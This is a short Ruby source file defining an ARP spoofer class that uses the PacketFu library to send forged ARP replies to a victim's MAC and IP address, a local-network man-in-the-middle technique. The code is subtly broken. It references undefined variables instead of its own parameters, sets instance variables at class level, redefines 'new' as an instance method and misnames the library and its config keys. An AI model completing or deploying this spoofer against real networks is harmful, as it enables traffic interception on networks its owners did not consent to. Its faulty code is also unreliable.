#-------------------------------------------------------------------------------
# ARP Spoofer Class
#-------------------------------------------------------------------------------
require "Packetfu"

class ARPSpoof

    @arp_packet = Packetfu::ARPPacket.new
    @interface = ""
    
    #---------------------------------------------------------------------------
    # new
    #
    # Initialization of the ARP Spoofer class.
    #
    # mac_addr - Victim's MAC Address
    # ip_addr - Victim's IP Address
    # opcode - ARP Opcode (default = 2)
    # iface - NIC Device (default = "em1")
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def new(mac_addr, ip_addr, opcode = 2, iface = "em1")
        cfg = Packetfu::Utils.whoami?(:iface => iface)
        
        @interface = iface
        @arp_packet.eth_saddr = cfg[:eth_addr]
        @arp_packet.eth_daddr = vic_addr_mac
        @arp_packet.eth_saddr_mac = cfg[:eth_addr]
        @arp_packet.eth_daddr_mac = vic_addr_mac
        @arp_packet.arp_saddr_ip = cfg[:ip_saddr]
        @arp_packet.arp_daddr_ip = vic_addr_ip
        @arp_packet.arp_opcode = opcode
        
    end # new
    
    #---------------------------------------------------------------------------
    # send
    #
    # Send ARP packets to the Victim
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def send
        @arp_packet.to_w(@interface)
    end # start
end
